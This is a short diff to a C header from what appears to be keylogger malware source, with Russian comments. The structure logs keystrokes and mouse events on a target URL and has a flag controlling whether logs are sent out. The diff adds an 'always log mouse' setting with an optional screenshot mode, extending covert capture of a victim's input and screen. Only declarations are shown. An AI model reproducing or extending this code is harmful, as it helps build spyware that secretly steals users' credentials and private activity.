@@ -120,6 +120,8 @@ typedef void(*TKLGMessageProc)(LPVOID Sender, PMSG Msg, bool IsUnicode);
 #define LOG_KEYBOARD 1
 #define LOG_MOUSE    2
 #define LOG_ALL      LOG_KEYBOARD | LOG_MOUSE
+#define LOG_MOUSE_NOT_SCREENSHOT 1
+#define LOG_MOUSE_SCREENSHOT	 2
 
 // ------------------------------------------------------
 // Режимы фильтрации окон
@@ -195,6 +197,7 @@ typedef struct TKeyLogSystem
 	PCHAR URL;                // Адрес на котором должна работать система
 
 	bool DontSendLog;         // Отключает отправку лога стандартными механизмами
+	int AlwaysLogMouse;		  // Всегда логгировать события мышки, LOG_MOUSE_NOT_SCREENSHOT - без скриншотов, LOG_MOUSE_SCREENSHOT - с скриншотами
 
 	//--------- данные времени выполнения ---------
 	bool TimeCompleted;     // Признак того, что система отработала своё время
